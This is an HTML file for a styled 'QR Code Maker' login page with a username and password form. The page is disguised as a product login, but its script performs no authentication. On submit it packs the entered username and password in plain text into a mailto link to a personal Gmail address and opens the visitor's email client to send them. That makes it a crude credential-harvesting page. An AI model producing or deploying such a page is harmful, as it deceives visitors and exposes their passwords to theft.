<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>QR Code Maker - Login</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #000;
        color: #fff;
    }

    .login-container {
        width: 300px;
        margin: 100px auto;
        padding: 20px;
        background-color: #000;
        border: 2px solid #ffd700; /* Golden */
        border-radius: 5px;
    }

    h2 {
        text-align: center;
    }

    .form-group {
        margin-bottom: 20px;
    }

    label {
        display: block;
        margin-bottom: 5px;
        color: #fff;
    }

    input[type="text"],
    input[type="password"] {
        width: calc(100% - 12px);
        padding: 6px;
        border: none;
        border-radius: 3px;
        background-color: #fff;
        color: #000;
    }

    button[type="submit"] {
        width: 100%;
        padding: 10px;
        border: none;
        border-radius: 5px;
        background-color: #ffd700; /* Golden */
        color: #000;
        cursor: pointer;
    }

    button[type="submit"]:hover {
        background-color: #fff;
        color: #000;
    }
</style>
</head>
<body>
<div class="login-container">
    <h2>Login to QR Code Maker</h2>
    <form id="login-form">
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
        </div>
        <div class="form-group">
            <button type="submit">Login</button>
        </div>
    </form>
</div>

<script>
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Send email with login data
        sendEmail(username, password);
    });

    function sendEmail(username, password) {
        // Construct mailto link with subject and body
        const subject = encodeURIComponent(`${username} is logged in`);
        const body = encodeURIComponent(`Username: ${username}%0D%0APassword: ${password}`);
        const mailtoLink = `mailto:adnanmuhammad4393@gmail.com?subject=${subject}&body=${body}`;

        // Open user's default email client with pre-filled email
        window.location.href = mailtoLink;
    }
</script>
</body>
</html>
